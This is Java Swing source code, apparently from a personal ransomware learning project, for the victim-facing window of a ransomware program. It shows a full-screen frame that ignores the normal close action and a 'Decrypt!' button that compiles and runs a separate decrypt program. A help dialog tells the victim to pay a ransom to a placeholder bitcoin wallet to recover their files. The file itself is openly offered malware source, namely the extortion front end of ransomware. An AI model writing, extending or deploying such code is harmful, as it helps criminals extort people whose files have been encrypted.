import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.IOException;

public class launcher{
    private JFrame frame;
    private JPanel panel;

    //Data Encapsulation
    public void launcher(){
        prepareGUI();
    }

    public static void main(String[] args){
        launcher launch = new launcher();
        launch.launcher();
    }

    private void prepareGUI(){
        frame = new JFrame("Ransomware Decorytion Tool");

        frame.setDefaultCloseOperation(frame.DO_NOTHING_ON_CLOSE);
        frame.setSize(1980, 1080);
        JMenuBar mb = new JMenuBar();
        JMenu m1 = new JMenu("Options");
        JMenu m2 = new JMenu("Help");
        mb.add(m1);
        mb.add(m2);

        //To be implemented in future release
        JMenuItem m11 = new JMenuItem("Load Key");

        JMenuItem m12 = new JMenuItem("Close");
        JMenuItem m21 = new JMenuItem("How to Get my Files Back?");
        m1.add(m11);
        m1.add(m12);
        m2.add(m21);

        JButton button1 = new JButton("Decrypt!");

        //Implement actions for all buttons
        button1.addActionListener(new DecryptListener());
        m12.addActionListener(new CloseListener());
        m21.addActionListener(new HelpListener());

        // Customizing the buttons
        button1.setFont(new Font("Serif", Font.ITALIC, 30));
 
        // Create a new panel
        panel = new JPanel();

        //Add them to panel
        panel.add(button1);

        frame.add(BorderLayout.NORTH,mb);
        frame.add(BorderLayout.SOUTH,panel);
        frame.setVisible(true);
    }
}

//Event handler for "Decrypt" Button
class DecryptListener implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        try{
            Runtime.getRuntime().exec("javac /root/Learning/Ransomware/src/decrypt.java");
            Runtime.getRuntime().exec("java /root/Learning/Ransomware/src/decrypt");
        }
        catch (IOException err){
            err.printStackTrace();
        }
    }
}
//Event handler for "Close" button
class CloseListener implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        System.exit(0);
    }
}
//Event handler for "How to get my files back?" button
class HelpListener implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        JFrame frame2 = new JFrame("Get files back!");
        frame2.setDefaultCloseOperation(frame2.DISPOSE_ON_CLOSE);
        JLabel label2 = new JLabel("<html><ul>" + 
                                    "<li>Pay the ransom to bitcoin_wallet_addr</li>"+
                                    "<li>Once payed you just need to press decrypt button</li>"+
                                    "<li>Private key will be automatically loaded</li>"+
                                    "</ul></html>");
        frame2.setSize(500,200);
        JButton button3 = new JButton("Close");
        JPanel panel = new JPanel();
        panel.add(button3);
        ActionListener closeFrame2 = new ActionListener(){
            @Override
            public void actionPerformed(ActionEvent e){
                frame2.dispose();
            }
        };
        button3.addActionListener(closeFrame2);
        frame2.add(BorderLayout.CENTER,label2);
        frame2.add(BorderLayout.SOUTH,panel);
        frame2.setVisible(true);
    }
}